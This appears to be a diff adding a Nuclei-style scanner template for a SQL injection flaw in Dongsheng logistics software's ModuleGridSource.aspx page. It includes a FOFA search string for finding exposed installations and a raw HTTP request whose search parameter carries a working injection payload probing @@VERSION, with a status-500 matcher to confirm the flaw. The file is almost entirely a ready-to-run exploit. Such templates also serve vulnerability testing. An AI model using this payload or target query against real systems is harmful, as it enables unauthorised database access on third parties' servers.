@@ -1,0 +1,21 @@
+id: poc-bwyggsoct1xvzixw
+info:
+  name: 东胜物流软件 ModuleGridSource.aspx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bwyggsoct1xvzixw'
+  tags: rce,sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bwyggsoct1xvzixw
+    fofa: app="东胜物流软件-物流软件"
+http:
+- raw:
+  - 'GET /Modules/ModuleGridSource.aspx?handle=list&search=name:a%'')and+<@@VERSION-- HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
